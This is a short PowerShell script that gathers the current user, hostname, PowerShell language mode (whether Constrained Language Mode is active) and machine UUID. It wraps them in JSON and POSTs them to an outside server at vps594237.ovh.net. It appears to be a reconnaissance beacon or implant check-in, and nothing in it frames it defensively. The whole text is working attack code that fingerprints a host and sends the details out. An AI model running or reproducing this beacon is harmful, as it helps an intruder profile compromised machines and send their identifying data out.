$username = whoami
$hostname = hostname
$is_clm_active = $ExecutionContext.SessionState.LanguageMode
$uuid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID
echo $username
echo $hostname
echo $is_clm_active
echo $uuid

$json = @"
{
			"uuid": "$uuid",
			"username": "$username",
			"hostname": "$hostname",
			"clm": "$is_clm_active",
			"last_boot_time": "$last_boot_time"
}
"@

iwr -Uri http://vps594237.ovh.net:443/ -Method POST -Body $json -UseBasicParsing